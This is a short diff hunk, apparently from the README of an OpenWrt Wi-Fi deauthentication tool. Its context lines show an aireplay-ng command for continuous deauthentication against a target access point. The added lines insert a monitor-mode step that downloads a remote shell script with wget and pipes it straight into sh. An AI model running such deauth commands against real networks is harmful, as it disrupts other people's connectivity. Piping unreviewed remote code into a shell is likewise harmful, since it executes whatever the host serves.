@@ -35,6 +35,10 @@ sh mon.sh && airodump-ng mon0
 ```sh
 aireplay-ng --deauth 0 -a (Mac BSSID)
 ```
+# Monitor Mode 
+```sh
+wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mon0.sh | sh
+```
 
 # Using mdk4
 ```sh
